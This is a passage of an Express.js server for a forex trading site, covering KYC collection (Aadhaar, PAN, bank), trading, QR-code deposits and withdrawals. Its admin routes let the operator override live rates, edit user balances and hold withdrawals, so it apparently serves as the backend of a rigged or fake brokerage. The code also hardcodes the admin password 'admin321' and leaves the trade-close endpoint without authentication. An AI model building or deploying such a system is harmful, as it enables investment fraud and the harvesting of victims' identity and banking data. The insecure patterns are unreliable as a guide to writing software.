  res.redirect('/dashboard');
});

app.get('/dashboard', requireAuth, (req, res) => {
  res.send(getDashboardPage());
});

app.get('/admin', (req, res) => {
  if (req.session.isAdmin) return res.redirect('/admin-panel');
  res.send(getAdminLoginPage());
});

app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === 'admin321') {
    req.session.isAdmin = true;
    return res.redirect('/admin-panel');
  }
  res.send(getAdminLoginPage('Invalid Master Password'));
});

app.get('/admin-panel', requireAdmin, (req, res) => {
  res.send(getAdminDashboardPage());
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/');
});

// JSON API
app.get('/api/user/data', requireAuth, (req, res) => {
  const user = db.users.find(u => u.id === req.session.userId);
  const trades = db.trades.filter(t => t.userId === req.session.userId);
  const deposits = db.deposits.filter(d => d.userId === req.session.userId);
  const withdrawals = db.withdrawals.filter(w => w.userId === req.session.userId);
  
  res.json({ success: true, user, trades, deposits, withdrawals, liveRates: db.rates });
});

app.post('/api/kyc/submit', requireAuth, (req, res) => {
  const { email, aadhar, pan, bank } = req.body;
  const user = db.users.find(u => u.id === req.session.userId);
  user.kycStatus = 'Pending';
  user.kycData = { email, aadhar, pan, bank };
  res.json({ success: true, message: 'KYC Details submitted successfully.' });
});

app.post('/api/trade/place', requireAuth, (req, res) => {
  const { pair, type, amount } = req.body;
  const user = db.users.find(u => u.id === req.session.userId);
  
  if (user.kycStatus !== 'Approved') {
    return res.json({ success: false, message: 'Trading disabled! KYC verification is required.' });
  }
  if (user.balance < amount) {
    return res.json({ success: false, message: 'Insufficient balance to place trade lot.' });
  }

  const currentRate = db.rates[pair];
  db.trades.push({
    id: nextTradeId++,
    userId: user.id,
    pair,
    type,
    amount,
    entry: currentRate,
    exit: null,
    pl: 0,
    status: 'Open'
  });
  res.json({ success: true, message: 'Trade executing at live terminal!' });
});

// Postion Close Logic (Both User Trigger via Admin or Directly by Admin Panel)
app.post('/api/trade/close', (req, res) => {
  const { tradeId } = req.body;
  const t = db.trades.find(trade => trade.id === parseInt(tradeId));
  if (!t || t.status !== 'Open') return res.json({ success: false, message: 'Trade already closed or not found' });
  
  const user = db.users.find(u => u.id === t.userId);
  const currentRate = db.rates[t.pair];
  
  let diff = currentRate - t.entry;
  if (t.type === 'SELL') { diff = t.entry - currentRate; }
  let multiplier = t.pair === 'USD/JPY' ? 100 : 10000;
  
  t.pl = parseFloat((diff * (t.amount / t.entry) * multiplier).toFixed(2));
  t.exit = currentRate;
  t.status = 'Closed';
  user.balance = parseFloat((user.balance + t.pl).toFixed(2));
  
  res.json({ success: true, message: `Position locked. Profit/Loss applied: $${t.pl}` });
});

app.post('/api/deposit', requireAuth, (req, res) => {
  const { amount, utr } = req.body;
  const user = db.users.find(u => u.id === req.session.userId);
  db.deposits.push({ id: nextDepId++, userId: user.id, username: user.username, type: 'DEPOSIT', amount, details: `UTR: ${utr}`, utr, status: 'Pending' });
  res.json({ success: true, message: 'Deposit request sent to clearing hub.' });
});

app.post('/api/withdraw', requireAuth, (req, res) => {
  const { amount, wallet } = req.body;
  const user = db.users.find(u => u.id === req.session.userId);
  if (user.balance < amount) return res.json({ success: false, message: 'Insufficient balance available.' });
  
  db.withdrawals.push({ id: nextWdId++, userId: user.id, username: user.username, type: 'WITHDRAWAL', amount, details: `Wallet: ${wallet}`, wallet, status: 'Pending' });
  res.json({ success: true, message: 'Withdrawal settlement processing.' });
});

// Admin Control Panel Endpoints
app.get('/api/admin/data', requireAdmin, (req, res) => {
  res.json({ success: true, users: db.users, deposits: db.deposits, withdrawals: db.withdrawals, rates: db.rates, trades: db.trades });
});

app.post('/api/admin/override-rate', requireAdmin, (req, res) => {
  const { pair, rate } = req.body;
  if (db.rates[pair] !== undefined) db.rates[pair] = parseFloat(rate);
  res.json({ success: true });
});

app.post('/api/admin/adjust-balance', requireAdmin, (req, res) => {
  const { userId, amount } = req.body;
  const user = db.users.find(u => u.id === parseInt(userId));
  if (user) user.balance = parseFloat((user.balance + parseFloat(amount)).toFixed(2));
  res.json({ success: true });
});

app.post('/api/admin/verify-kyc', requireAdmin, (req, res) => {
  const { userId, status } = req.body;
  const user = db.users.find(u => u.id === parseInt(userId));
  if (user) user.kycStatus = status;
  res.json({ success: true });
});

app.post('/api/admin/deposit/approve', requireAdmin, (req, res) => {
  const { id } = req.body;
  const dep = db.deposits.find(d => d.id === parseInt(id));
  if (dep && dep.status === 'Pending') {
    dep.status = 'Approved';
    const user = db.users.find(u => u.id === dep.userId);
    if (user) user.balance += dep.amount;
  }
  res.json({ success: true });
});

app.post('/api/admin/deposit/reject', requireAdmin, (req, res) => {
  const { id } = req.body;
  const dep = db.deposits.find(d => d.id === parseInt(id));
  if (dep) dep.status = 'Rejected';
  res.json({ success: true });
});

app.post('/api/admin/approve-withdraw', requireAdmin, (req, res) => {
  const { id } = req.body;
  const wd = db.withdrawals.find(w => w.id === parseInt(id));
  if (wd && wd.status === 'Pending') {
    wd.status = 'Approved';
    const user = db.users.find(u => u.id === wd.userId);
    if (user) user.balance -= wd.amount;
  }
  res.json({ success: true });
});

app.post('/api/admin/reject-withdraw', requireAdmin, (req, res) => {
  const { id } = req.body;
  const wd = db.withdrawals.find(w => w.id === parseInt(id));
  if (wd) wd.status = 'Rejected';
  res.json({ success: true });
});

app.post('/api/admin/upload-qr', requireAdmin, upload.single('qr'), (req, res) => {
  if (req.file) {
    db.settings.qrCodeBuffer = req.file.buffer;
    db.settings.qrCodeMime = req.file.mimetype;
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

app.get('/qr-image', (req, res) => {
  if (db.settings.qrCodeBuffer) {
    res.set('Content-Type', db.settings.qrCodeMime);
    res.send(db.settings.qrCodeBuffer);
  } else {
    res.set('Content-Type', 'image/svg+xml');
    res.send(`<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
      <rect width="200" height="200" fill="#121212"/>
      <text x="50%" y="45%" dominant-baseline="middle" text-anchor="middle" fill="#00ff88" font-family="sans-serif" font-size="16" font-weight="bold">QR CODE</text>
      <text x="50%" y="60%" dominant-baseline="middle" text-anchor="middle" fill="#888888" font-family="sans-serif" font-size="12">Not Uploaded Yet</text>
    </svg>`);
  }
});

app.listen(3000, () => console.log('Terminal online at port 3000'));
